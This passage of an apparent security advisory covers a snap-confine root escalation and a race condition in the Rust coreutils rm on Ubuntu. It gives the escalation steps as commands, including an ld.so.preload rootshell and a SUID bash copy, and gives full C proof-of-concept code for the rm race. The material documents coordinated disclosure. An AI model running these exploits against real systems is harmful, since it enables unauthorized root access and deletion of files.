> outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confi=
ne --base snapd snap.snap-store.hook.configure /nonexistent
> cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_GCNDEM//dev=
: No such file or directory
>
> outside$ exit
>
> outside$ ~/snap-store_25.10
> ...
> hange.go:351: DEBUG: mount name:"/var/lib" dir:"/tmp/.snap/var/lib" type:=
"" opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
> change.go:351: DEBUG: mount name:"tmpfs" dir:"/var/lib" type:"tmpfs" opts=
: unparsed:"mode=3D0755,uid=3D0,gid=3D0" (error: <nil>)
> ...
> change.go:426: DEBUG: umount "/tmp/.snap/var/lib" UMOUNT_NOFOLLOW|MNT_DET=
ACH (error: invalid argument)
> change.go:399: DEBUG: ignoring EINVAL from unmount, "/tmp/.snap/var/lib" =
is not mounted
> change.go:477: DEBUG: remove "/tmp/.snap/var/lib" (error: remove /tmp/.sn=
ap/var/lib: directory not empty)
> ...
> /var/lib/snapd not root-owned 1001:1001
> ------------------------------------------------------------------------
>
> Third, still from outside snap-store's sandbox but inside its /tmp
> directory:
>
> - we create a copy of /etc in ./.snap/etc (/tmp/.snap/etc inside the
>   sandbox), we add /tmp/librootshell.so to ./.snap/etc/ld.so.preload, we
>   create ./librootshell.so (/tmp/librootshell.so inside the sandbox), a
>   simple shellcode that calls setreuid(0) and execve(/tmp/sh), we copy
>   /usr/bin/busybox to ./sh (/tmp/sh inside the sandbox), and we add the
>   following to ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab,
>   which will bind-mount our copy of /etc inside snap-store's sandbox:
>
>   /tmp/.snap/etc /etc none rbind,rw 0 0
>
> - we also add the following line to
>   ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab (and replace
>   our own ./.snap/var/lib with the original ./.snap/var/lib.exchange),
>   which will bind-mount the original, root-owned /var/lib/snapd inside
>   snap-store's sandbox (otherwise snap-confine dies because it detects
>   that /var/lib/snapd does not belong to root -- it belongs to us since
>   we won the race condition against the "mimic" creation of /var/lib):
>
>   /tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0
>
> ------------------------------------------------------------------------
> outside$ cp -a /etc ./.snap
> ...
>
> outside$ echo /tmp/librootshell.so > ./.snap/etc/ld.so.preload
>
> outside$ cp ~/librootshell.so ./
>
> outside$ cp /usr/bin/busybox ./sh
>
> outside$ echo '/tmp/.snap/etc /etc none rbind,rw 0 0' > ./.snap/var/lib/s=
napd/mount/snap.snap-store.user-fstab
>
> outside$ echo '/tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0'=
 >> ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab
>
> outside$ mv ./.snap/var/lib ./.snap/var/lib.exchange2
>
> outside$ mv ./.snap/var/lib.exchange ./.snap/var/lib
> ------------------------------------------------------------------------
>
> Fourth, we obtain a root shell inside snap-store's sandbox, by executing
> snap-confine with one of the SUID-root binaries in /tmp/.snap (such as
> /tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su), which
> is dynamically linked and therefore preloads our /tmp/librootshell.so
> and executes our shellcode (and hence a busybox shell) as root.
>
> ------------------------------------------------------------------------
> outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confi=
ne --base core22 snap.snap-store.hook.configure /tmp/.snap/var/lib/snapd/ho=
stfs/snap/core22/current/usr/bin/su
> ...
> BusyBox v1.37.0 (Ubuntu 1:1.37.0-4ubuntu1) built-in shell (ash)
> ...
>
> inside# id
> uid=3D0(root) gid=3D1001(jane) groups=3D100(users),1001(jane)
> ^^^^^^^^^^^
>
> inside# cat /etc/shadow
> cat: can't open '/etc/shadow': No such file or directory
> ------------------------------------------------------------------------
>
> Fifth, because this root shell is still inside snap-store's sandbox,
> confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
> to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
> allowed by the AppArmor profile and the seccomp filter), and execute
> this SUID-root shell from outside snap-store's sandbox, thereby finally
> gaining full root privileges.
>
> ------------------------------------------------------------------------
> inside# cp /bin/bash /var/snap/snap-store/common/
>
> inside# chmod 04755 /var/snap/snap-store/common/bash
>
> inside# exit
>
> outside$ /var/snap/snap-store/common/bash -p
>
> outside# id
> uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane),100(=
users)
>                               ^^^^^^^^^^^^
>
> outside# cat /etc/shadow
> root:*:20368:0:99999:7:::
> daemon:*:20368:0:99999:7:::
> ...
> ------------------------------------------------------------------------
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> A quick note on the uutils coreutils (the rust-coreutils)
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
> In August 2025, before the release of Ubuntu 25.10, the Ubuntu Security
> Team proactively contacted us and kindly asked us if we were interested
> in reviewing the security of the uutils coreutils (a Rust rewrite of the
> standard GNU coreutils -- ls, cp, rm, cat, sort, sleep, etc), which are
> since then installed by default in Ubuntu 25.10.
>
> We were deeply interested, and honored, but unfortunately at the time we
> were already working full-time on another project; so we told the Ubuntu
> Security Team that we would not be able to conduct an official security
> review, but that we would try to work on it anyway during our free time.
>
> We started by carefully reading the following report, which already
> contained extremely valuable information; in particular, the mention of
> "unsafe, racy, tree walking algorithms" caught our attention:
>
>   https://bugs.launchpad.net/ubuntu/+source/rust-coreutils/+bug/2111815
>
> From our work on apport (CVE-2025-5054), we then remembered that the
> shell script /etc/cron.daily/apport is installed by default on Ubuntu,
> is executed as root once per day, and can recursively delete entire
> sub-directories of /var/crash, which is world-writable like /tmp:
>
> ------------------------------------------------------------------------
> $ cat /etc/cron.daily/apport
> ...
> find /var/crash/. ! -name . -prune -type d -regextype posix-extended -reg=
ex '.*/[0-9]{12}$' \( -mtime +7 \) -exec rm -Rf -- '{}' \;
>
> $ stat /var/crash
> ...
> Access: (3777/drwxrwsrwt)  Uid: (    0/    root)   Gid: (    0/    root)
> ...
> ------------------------------------------------------------------------
>
> Since rm is one of the uutils coreutils, we decided to create a
> directory /var/crash/base/parent/target (as an unprivileged attacker)
> and to analyze the strace of an "rm -Rf /var/crash/base" command (as
> root), and we quickly discovered that rm was vulnerable to a trivial
> race condition:
>
> ------------------------------------------------------------------------
>   1 execve("/usr/bin/rm", ["rm", "-Rf", "/var/crash/base"], ...) =3D 0
> ...
> 147 openat(AT_FDCWD, "/var/crash/base", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_D=
IRECTORY) =3D 3
> ...
> 152 openat(AT_FDCWD, "/var/crash/base/parent", O_RDONLY|O_NONBLOCK|O_CLOE=
XEC|O_DIRECTORY) =3D 4
> ...
> 158 openat(AT_FDCWD, "/var/crash/base/parent/target", O_RDONLY|O_NONBLOCK=
|O_CLOEXEC|O_DIRECTORY) =3D 5
> ...
> 163 rmdir("/var/crash/base/parent/target")  =3D 0
> ...
> 167 rmdir("/var/crash/base/parent")         =3D 0
> ...
> 171 rmdir("/var/crash/base")                =3D 0
> ...
> 174 exit_group(0)                           =3D ?
> ------------------------------------------------------------------------
>
> - if, after rm calls openat() on /var/crash/base/parent (at line 152),
>   but before rm calls openat() on /var/crash/base/parent/target (at line
>   158), if the attacker replaces /var/crash/base/parent with a symlink
>   (which will be followed by rm) to another part of the filesystem (for
>   example, to /etc), then this attacker can delete arbitrary parts of
>   the filesystem, as root (the shell script /etc/cron.daily/apport is
>   executed as root);
>
> - for example, if the attacker replaces "parent" with a symlink to /etc,
>   and if "target" is "ppp", then rm will recursively delete the entire
>   /etc/ppp directory.
>
> We immediately reported this vulnerability to Ubuntu, who, as a
> temporary mitigation in Ubuntu 25.10, replaced the default rm with a
> symlink to the standard GNU coreutils' rm (i.e., in Ubuntu 25.10, rm is
> a symlink to /usr/bin/gnurm, not a symlink to the uutils coreutils'
> /usr/lib/cargo/bin/coreutils/rm).
>
> To the best of our knowledge, this vulnerability in the uutils
> coreutils' rm was later fixed upstream (by calling openat() relatively
> to each component of a path, instead of calling openat() on absolute
> paths and resolving each path component multiple times), by commits:
>
>   https://github.com/uutils/coreutils/commit/1183529cd2deafb38bed3b6bf212=
357b68eefa41
>   https://github.com/uutils/coreutils/commit/e773c95c4e62424db17563242c35=
e488a6d1ae9b
>   https://github.com/uutils/coreutils/commit/45e6cbd109a0a33d82e90c985813=
ea83d4009714
>
> However, at the time of writing this advisory, the uutils coreutils'
> /usr/lib/cargo/bin/coreutils/rm that is shipped with Ubuntu 25.10 is
> still vulnerable (but unused, since the default is the GNU coreutils'
> rm); this allows us to test what would have happened if the vulnerable
> rm had been shipped as the default in Ubuntu 25.10. For example, below
> we run our proof of concept as an unprivileged user, and root executes
> the rm command that would have been executed by /etc/cron.daily/apport,
> thereby accidentally deleting the entire /etc/ppp directory:
>
> ------------------------------------------------------------------------
> $ cat /etc/os-release
> PRETTY_NAME=3D"Ubuntu 25.10"
> ...
>
> $ id
> uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
>
> $ cat > uutils_rm.c << "EOF"
> #define _GNU_SOURCE
> #include <sys/inotify.h>
> #include <sys/param.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <dirent.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <utime.h>
>
> #define die() do { \
>     fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
>     exit(EXIT_FAILURE); \
> } while (0)
>
> int
> main(const int argc, const char * const argv[])
> {
>     if (argc < 3) die();
>     const char * const writable_dir =3D argv[1];
>     if (*writable_dir !=3D '/') die();
>
>     const char * const parent_dir =3D strdup(argv[2]);
>     if (!parent_dir) die();
>     char * const last_slash =3D strrchr(parent_dir, '/');
>     if (!last_slash) die();
>
>     const char * const target_dir =3D strdup(last_slash + 1);
>     if (!target_dir) die();
>
>     last_slash[1] =3D '\0';
>     if (*parent_dir !=3D '/') die();
>     if (!*target_dir) die();
>
>     unsigned long n_pre_dirs =3D 32;
>     if (argc > 3) {
>         if (argc !=3D 4) die();
>         n_pre_dirs =3D strtoul(argv[3], NULL, 0);
>     }
>     if (n_pre_dirs <=3D 0) die();
>     if (n_pre_dirs > (1u<<20)) die();
>
>     if (chdir(writable_dir)) die();
>     char base_dir[] =3D "XXXXXX";
>     if (!mkdtemp(base_dir)) die();
>     if (chdir(base_dir)) die();
>
>     if (mkdir("parent", 0700)) die();
>     if (chdir("parent")) die();
>     if (mkdir(target_dir, 0700)) die();
>
>     const char * first_dir =3D NULL;
>     for (;;) {
>         char try[] =3D "XXXXXX";
>         if (!mkdtemp(try)) die();
>
>         unsigned long n =3D 0;
>         DIR * const dirp =3D opendir(".");
>         if (!dirp) die();
>         for (;;) {
>             const struct dirent * const entp =3D readdir(dirp);
>             if (!entp) die();
>             if (*entp->d_name =3D=3D '.') continue;
>             if (!strcmp(entp->d_name, target_dir)) break;
>             n++;
>             if (!first_dir) {
>                 first_dir =3D strdup(entp->d_name);
>                 if (!first_dir) die();
>             }
>         }
>         if (closedir(dirp)) die();
>         if (n >=3D n_pre_dirs) break;
>     }
>     if (!first_dir) die();
>
>     if (chdir(first_dir)) die();
>     unsigned long i;
>     for (i =3D 0; i < n_pre_dirs; i++) {
>         char num[256];
>         snprintf(num, sizeof(num), "%lu", i);
>         if (mkdir(num, 0700)) die();
>     }
>     const int in_fd =3D inotify_init();
>     if (in_fd <=3D -1) die();
>     if (inotify_add_watch(in_fd, ".", IN_ATTRIB) <=3D -1) die();
>
>     if (chdir("..")) die();
>     if (chdir("..")) die();
>     if (symlink(parent_dir, "../switch")) die();
>     static const struct utimbuf epoch =3D { 1, 1 };
>     if (utime(".", &epoch)) die();
>
>     fprintf(stderr, "ready\n");
>     static char in_buf[sizeof(struct inotify_event) + NAME_MAX + 1];
>     if (read(in_fd, in_buf, sizeof(in_buf)) < (ssize_t)sizeof(struct inot=
ify_event)) die();
>     if (renameat2(AT_FDCWD, "parent", AT_FDCWD, "../switch", RENAME_EXCHA=
NGE)) die();
>     die();
> }
> EOF
>
> $ gcc -s -o uutils_rm uutils_rm.c
>
> $ stat /etc/ppp
> ...
> Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
> ...
>
> $ ./uutils_rm /var/crash /etc/ppp
> ready
> ------------------------------------------------------------------------
>
> Then, as root (to simulate the /etc/cron.daily/apport shell script):
>
> ------------------------------------------------------------------------
> # id
> uid=3D0(root) gid=3D0(root) groups=3D0(root)
>
> # dpkg -S /usr/lib/cargo/bin/coreutils/rm
> rust-coreutils: /usr/lib/cargo/bin/coreutils/rm
>
> # dpkg -l rust-coreutils
> ...
> ii  rust-coreutils 0.2.2-0ubuntu2.1 amd64        Universal coreutils util=
s, written in Rust
>
> # find /var/crash/. ! -name . -prune -type d \( -mtime +7 \) -exec /usr/l=
ib/cargo/bin/coreutils/rm -Rf -- '{}' \;
> ...
>
> # stat /etc/ppp
> stat: cannot stat '/etc/ppp': No such file or directory (os error 2)
> ------------------------------------------------------------------------
>
> Back in September 2025, we reported this vulnerability to Ubuntu as a
> denial of service (the ability to delete arbitrary files and directories
> as root), but after writing this advisory it became perfectly clear that
> this vulnerability was actually powerful enough to be transformed into a
> Local Privilege Escalation (LPE) to full root (for example by deleting a
> /tmp/snap-private-tmp/$SNAP/tmp/.snap directory). Fortunately, this LPE
> was avoided thanks to the Ubuntu Security Team, who proactively reached
> out to us and mitigated it before the release of Ubuntu 25.10.
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> Acknowledgments
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
> We thank everyone at Canonical who worked on this release (Seth Arnold,
> Zygmunt Krynicki, Nick Dyer, Eduardo Barretto, and Luci Stanescu, in
> particular) and on the uutils coreutils with us (Octavio Galland, Ravi
> Kant Sharma, Seth Arnold, and Julian Andres Klode, in particular). We
> also thank the members of the linux-distros mailing list (Alexander
> Peslyak in particular).
>
> Finally, we dedicate this advisory to Felix Lindner:
>
>   https://phenoelit.de/fx.html
>   https://defcon.social/@thedarktangent/116157827849844661
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> Timeline
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
> 2025-12-15: We sent a draft of our advisory and two proofs of concept
> (firefox_24.04.c and snap-store_25.10.c) to the Ubuntu Security Team.
>
> 2026-03-12: The Ubuntu Security Team sent a patch, and we sent a draft
> of our advisory, to the linux-distros mailing list.
>
> 2026-03-17: Coordinated Release Date (14:00 UTC).
